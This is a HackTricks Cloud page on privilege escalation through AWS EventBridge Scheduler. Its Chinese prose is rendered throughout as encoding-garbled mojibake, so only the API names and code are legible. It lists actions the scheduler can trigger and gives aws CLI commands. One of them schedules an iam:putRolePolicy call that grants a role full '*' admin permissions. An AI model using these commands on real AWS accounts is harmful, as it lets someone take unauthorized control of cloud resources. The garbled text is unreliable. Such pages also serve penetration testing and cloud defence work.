# AWS - EventBridge Scheduler Privesc

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## EventBridge Scheduler

EventBridge Scheduler å¯ç”¨äºé€šè¿‡è°ƒåº¦å¯¹å„ç§ AWS æœåŠ¡çš„è°ƒç”¨æ¥è¿›è¡Œæƒé™æå‡ã€‚é€šè¿‡åˆ©ç”¨å…¶æŒ‰è®¡åˆ’è°ƒç”¨æœåŠ¡çš„èƒ½åŠ›ï¼Œå…·æœ‰è¶³å¤Ÿæƒé™çš„ç”¨æˆ·å¯ä»¥æå‡æƒé™ã€‚ä»¥ä¸‹æ˜¯ EventBridge Scheduler å¯ä»¥ä½¿ç”¨æ¨¡æ¿ç›®æ ‡è§¦å‘çš„ä¸€äº›å…³é”®æ“ä½œï¼š

- Lambda: lambda:InvokeFunction - æŒ‰è®¡åˆ’è°ƒç”¨ Lambda å‡½æ•°ã€‚
- CodeBuild: codebuild:StartBuild - å¯åŠ¨ AWS CodeBuild é¡¹ç›®ã€‚
- CodePipeline: codepipeline:StartPipelineExecution - è§¦å‘ AWS CodePipeline æ‰§è¡Œã€‚
- ECS: ecs:RunTask - è¿è¡Œ ECS ä»»åŠ¡ã€‚
- EventBridge: events:PutEvents - å°†äº‹ä»¶æ”¾å…¥ EventBridgeã€‚
- Inspector: inspector:StartAssessmentRun - å¯åŠ¨ Amazon Inspector è¯„ä¼°ã€‚
- Kinesis: kinesis:PutRecord - å°†è®°å½•æ”¾å…¥ Kinesis æµã€‚
- Firehose: firehose:PutRecord - å°†è®°å½•æ”¾å…¥ Firehose äº¤ä»˜æµã€‚
- SageMaker: sagemaker:StartPipelineExecution - å¯åŠ¨ SageMaker ç®¡é“æ‰§è¡Œã€‚
- SNS: sns:Publish - å‘ SNS ä¸»é¢˜å‘å¸ƒæ¶ˆæ¯ã€‚
- SQS: sqs:SendMessage - å‘ SQS é˜Ÿåˆ—å‘é€æ¶ˆæ¯ã€‚
- Step Functions: states:StartExecution - å¯åŠ¨ AWS Step Functions çš„æ‰§è¡Œã€‚

è¿™äº›åªæ˜¯ EventBridge Scheduler å¯ä»¥æ‰§è¡Œçš„ä¸€äº›æ¨¡æ¿æ“ä½œã€‚ç„¶è€Œï¼Œé€šè¿‡ä½¿ç”¨é€šç”¨ç›®æ ‡ï¼Œå¯ä»¥è°ƒç”¨è®¸å¤šå…¶ä»– AWS æœåŠ¡çš„æ“ä½œã€‚é€šç”¨ç›®æ ‡å…è®¸è¿›è¡Œè¶…å‡ºæ¨¡æ¿åˆ—è¡¨çš„æ›´å¹¿æ³›çš„ API æ“ä½œã€‚

æœ‰å…³ EventBridge Scheduler çš„æ›´å¤šä¿¡æ¯ï¼š

{% content-ref url="../aws-services/eventbridgescheduler-enum.md" %}
[eventbridgescheduler-enum.md](../aws-services/eventbridgescheduler-enum.md)
{% endcontent-ref %}

### `sts:AssumeRole`, `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

å…·æœ‰ `sts:AssumeRole`ã€`iam:PassRole` å’Œ `scheduler:CreateSchedule æˆ– scheduler:UpdateSchedule` æƒé™çš„ç”¨æˆ·å¯ä»¥é€šè¿‡åˆ©ç”¨ EventBridge Scheduler è°ƒç”¨ä½¿ç”¨æ›´é«˜æƒé™è§’è‰²çš„æœåŠ¡æ¥æå‡æƒé™ã€‚

æ‹¥æœ‰è¿™äº›æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥å‡è®¾ä¸€ä¸ªå…·æœ‰æ›´é«˜æƒé™çš„è§’è‰²ï¼Œå¹¶åœ¨åˆ›å»ºæˆ–æ›´æ–°è®¡åˆ’æ—¶å°†è¯¥è§’è‰²ä¼ é€’ç»™ EventBridge Schedulerã€‚è¯¥è®¡åˆ’å¯ä»¥é…ç½®ä¸ºæ‰§è¡Œä¹‹å‰åˆ—å‡ºçš„ä»»ä½•æ“ä½œï¼Œä¾‹å¦‚è°ƒç”¨ Lambda å‡½æ•°ã€å¯åŠ¨ ECS ä»»åŠ¡ã€è§¦å‘ CodePipeline æ‰§è¡Œæˆ–æ‰§è¡Œ EventBridge Scheduler æ”¯æŒçš„ 270 ä¸ª AWS æœåŠ¡ä¸­çš„ä»»ä½•æ“ä½œã€‚é€šè¿‡è°ƒåº¦è¿™äº›æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æ»¥ç”¨æ›´é«˜çš„æƒé™åœ¨ AWS æœåŠ¡ä¸­æ‰§è¡Œæœªç»æˆæƒçš„æ“ä½œã€‚
\\

ä¾‹å¦‚ï¼Œä»–ä»¬å¯ä»¥é…ç½®è®¡åˆ’ä»¥è°ƒç”¨ä¸€ä¸ª Lambda å‡½æ•°ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¨¡æ¿æ“ä½œï¼š
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
é™¤äº†æ¨¡æ¿åŒ–çš„æœåŠ¡æ“ä½œï¼Œæ‚¨å¯ä»¥åœ¨ EventBridge Scheduler ä¸­ä½¿ç”¨é€šç”¨ç›®æ ‡æ¥è°ƒç”¨è®¸å¤š AWS æœåŠ¡çš„å¹¿æ³› API æ“ä½œã€‚é€šç”¨ç›®æ ‡æä¾›äº†çµæ´»æ€§ï¼Œå¯ä»¥è°ƒç”¨å‡ ä¹ä»»ä½• APIã€‚ä¸€ä¸ªä¾‹å­æ˜¯ä½¿ç”¨é€šç”¨ç›®æ ‡æ·»åŠ  "AdminAccessPolicy"ï¼Œä½¿ç”¨å…·æœ‰ "putRolePolicy" ç­–ç•¥çš„è§’è‰²ï¼š
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## å‚è€ƒæ–‡çŒ®

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
